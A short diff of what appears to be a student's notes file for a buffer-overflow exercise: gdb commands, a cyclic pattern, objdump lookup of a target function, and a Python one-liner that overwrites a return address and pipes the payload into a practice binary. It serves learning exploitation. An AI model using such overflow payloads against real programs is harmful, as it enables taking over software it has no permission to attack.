@@ -9,12 +9,15 @@ b *fail+69
 r < a.txt
 info frame
 
+
+
 cyclic 10
 
 objdump -d Xzone.exe | grep target
 
 PYTHONIOENCODING=utf-8 python -c "print('B'*9 + 'b'*8 + '\x93\x15\x40')" | xxd
 PYTHONIOENCODING=utf-8 python -c "print('B'*9 + 'b'*8 + '\x93\x15\x40')" | ./Xzone
+
 
 Q1
 08049233
